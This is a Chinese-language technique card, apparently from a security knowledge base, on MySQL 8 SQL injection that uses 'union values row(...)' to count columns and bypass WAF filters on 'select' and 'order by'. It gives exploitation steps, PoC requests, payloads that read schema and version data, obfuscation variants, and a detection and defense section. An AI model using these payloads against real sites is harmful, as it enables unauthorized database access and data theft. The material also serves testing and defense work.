---
id: web-generic-sqli-mysql8-values-row-column-count-union-probe
title: MySQL 8 VALUES ROW(...) 充当表值构造器：用 union values row(1,2,…) 试列数并直接占回显位，替代被过滤的 order by 与 select
type: scenario
domain: web
path: web/generic/sqli
technique: mysql8-values-row-column-count-union-probe
aliases:
- union values row 判列数
- VALUES 表值构造器
- 替代 order by 判列数
- MySQL8 联合查询列数探测
- 无 select 的 union 注入
tags:
- web
- sqli
- mysql
- mysql8
- values-row
- union
- column-count
- waf-bypass
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: MySQL 8.0（原文标注 MySQL 8.0.21 环境；VALUES 独立语句自 8.0.19 起可用）
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:48:32+08:00'
  notes: 已对照原文核对：VALUES ROW 为表值构造器、可单独执行也可与 union 联用、列数不匹配即报错可替代 order by 判列、回显位用常量数字确认，均与原文「通常的注入步骤」一致；未验证点：报错原文（ERROR 1222 文本）摘自 MySQL 通用信息，原文仅演示列数判定与回显；affected_versions 的 8.0.19 起点来自官方文档，原文只标注 8.0.21
---

## 一句话结论

MySQL 8 的 `VALUES ROW(v1,v2,…)[, ROW(...)]` 是一个独立的表值构造器语句，可以直接作为 `UNION` 的一侧，因此当 `select` 被过滤、或 `order by` 判列数被拦截时，用 `-1 union values row(1,2)`、`row(1,2,3)` 逐个加常量试探，既能靠“列数不匹配就报错/回显异常”判定真实列数，又能直接在回显位放位置标记（`1,2,3…`）确认哪一列可回显，之后再把标记换成 `database()`、`@@version` 或子查询。

## 原理

- **VALUES 是表值构造器**：`VALUES ROW(1,-2,3), ROW(5,7,9)` 单独执行就返回一张 `column_0..column_n` 的临时表，也可以 `ORDER BY column_1`、`LIMIT n`。它属于 DML 语句而非 `select`，所以字面上不含 `select`/`union select` 这类常被 WAF 盯上的组合中的 `select` 部分。
- **能参与 UNION**：`select ... union values row(1,2,3)` 合法——UNION 两侧只要是“行集合”即可，一侧是 SELECT、一侧是 VALUES 构造器。列数必须相同，否则 MySQL 报 `The used SELECT statements have a different number of columns`（或 `Operand should contain N column(s)`），这正是判列数的 oracle。
- **替代 ORDER BY 判列**：`1 order by 2`、`order by 3` 递增法是最常见的判列手段，但 `order by` 常被黑名单直接拦截；改用 `-1 union values row(1,2,3)` 递增常量，同样以报错与否判定列数，且不需要 `order by` 关键字。
- **同时确认回显位**：列数对上后，返回结果里会出现 `1,2,3` 这些字面量，观察哪个数字原样出现在页面（而不是被业务字段覆盖）就能确定回显位，比 `union select 1,2,3` 更隐蔽；之后把该位置的常量替换成 `database()`、`user()`、`@@version`、子查询或 `concat(0x7e,(select …))`。
- **与 TABLE 语句互补**：`TABLE t` 是“读整表”，适合盲注/行比较（`TABLE` 不能控制列数，列数固定为表的列数）；`VALUES ROW(...)` 是“我自带列数”，适合构造任意列数的联合查询，两者是同一版本特性下的两个不同原语。
- **无过滤时也是好用的短 payload**：它比 `select 1,2,3` 更短，在长度受限或 `select` 被拦的场景里直接可用。

## 触发条件

- 目标为 MySQL 8.0.19+（独立 `VALUES` 语句可用；`VALUES ROW` 作表值构造器在 8.0.19 起支持）。
- 存在可注入的字符串/数字上下文，`UNION` 未被完全拦截，且 `select`、`order by` 可能被 WAF 拦截。
- 页面能反映列数错误（报错回显或布尔差异）。
- 联合查询两侧类型兼容（`values row(1,2,3)` 的常量类型能隐式转换到目标列类型）。

## 利用步骤

1. 先用 `-1 union values row(1)` 起试，若报列数不匹配则递增：`row(1,2)`、`row(1,2,3)`……直到错误消失，得到列数 N。
2. 观察返回页面中哪些数字（1/2/3…）原样出现、哪些被业务字段值覆盖，确定可回显列的位置（例如第 2 列）。
3. 把该位置的常量替换成探测表达式：`-1 union values row(1,database(),3)` 读库名；`@@version`、`user()`、`current_user` 同理。
4. 需要读表/字段时，用子查询放进 VALUES 的对应位置：`row(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3)`；若 `select` 被拦，改用 `table information_schema.tables limit n,1` 的整行比较或盲注方案。
5. 若回显被严格转义/截断，退回布尔/时间盲注：`-1 and ('def',…)>(table information_schema.schemata limit 0,1)`（见关联卡）。
6. 判列数也可复用同一技巧做“列数探测”：业务表列数未知时，`union values row(...)` 的报错信息本身就是列数提示。

## PoC

```http
GET /?id=-1 union values row(1,2)--+ HTTP/1.1
Host: target
```

```text
-- 列数不匹配时：
ERROR 1222 (21000): The used SELECT statements have a different number of columns
-- 列数正确时，页面直接出现：
1
2
```

```sql
-- 确定回显位后逐项读取
-1 union values row(1,database(),3)--+
-1 union values row(1,@@version,3)--+
-1 union values row(1,(table information_schema.schemata limit 0,1),3)--+
```

说明：`values row(1,2,3)` 的常量个数即列数；原文在 MySQL 8.0.21 环境与 sql-lab 中演示 `select * from t where id=1 union values row(1,2,3)` 的列数判定，并在一条被禁用 `select`/`union` 的题目里改用 `TABLE` 做盲注。本卡未复跑。

## 变体与关联

- **写法变体**：`union values row(1,2)` 可写成 `union values row(1),(2)`（每个 ROW 一行）、`union all values row(...)`；也可把 VALUES 单独作为派生表 `from (values row(1,2)) as t` 用来构造数据。
- **报错/盲注变体**：列数判定用报错；回显位判定也可用 `if(1=1,1,0)` 的布尔差异或 `sleep()` 时间差。
- **被拦时的替代**：`values` 被拦可用 `table`（读整表列数固定）、`select` 可用注释混淆 `/*!50000select*/`、或用 `ROW(...)` 函数而非 `VALUES` 语句。
- 关联：[[web-generic-sqli-mysql8-table-row-constructor-lexicographic-blind]]（同版本 `TABLE` 行比较盲注，解决“不知道列名/不能写列名”）、[[web-generic-sqli-mysql8-table-keyword-exp-error-bypass]]（TABLE + exp(710) 报错 oracle）、[[web-generic-sqli-sqlite-union-values-select-filter-bypass]]（SQLite 侧同类 `union values` 绕过 `select` 过滤的手法）、[[web-generic-sqli-order-by-union-lexicographic-blind]]（字典序盲注）。
- 边界：MySQL < 8.0.19 无独立 `VALUES` 语句；列类型严格时常量需显式转换（如 `cast`）否则报类型错误；`UNION` 被整体拦截时该原语不可用；列数判错会导致后续 payload 全部失败。

## 检测与防御

- 检测：SQL 日志/审计中出现 `union values row(`、`values row(1,2` 等异常构造；同一参数短时间内呈现“列数 1、2、3…”递增的多次请求且伴随错误响应（典型列数探测）。
- 检测：WAF 命中缺失 `select` 但出现 `union`、`values`、`row(`、`information_schema` 的组合。
- 防御：参数化查询/预编译；WAF 覆盖 `VALUES`、`ROW(`、`UNION`；关闭详细 SQL 错误回显（避免列数/类型错误泄露结构）；对高频探测请求限速。
- 加固：数据库账号最小权限，限制 `information_schema` 访问；错误信息统一化，不向用户返回列数/类型/表结构细节。
